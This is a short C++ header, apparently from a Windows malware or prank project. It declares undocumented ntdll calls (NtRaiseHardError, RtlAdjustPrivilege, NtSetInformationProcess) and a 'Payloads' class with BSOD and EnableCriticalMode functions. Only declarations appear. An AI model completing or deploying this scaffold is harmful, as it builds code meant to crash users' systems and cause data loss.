#pragma once

#include <shlobj.h>
#include <shellapi.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

extern "C"
{
	NTSTATUS NTAPI NtRaiseHardError(DWORD, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
	NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
}

namespace Payloads
{
	class Payloads
	{
	public:
		__declspec(dllexport) void BSOD();
		__declspec(dllexport) void EnableCriticalMode();
	};
}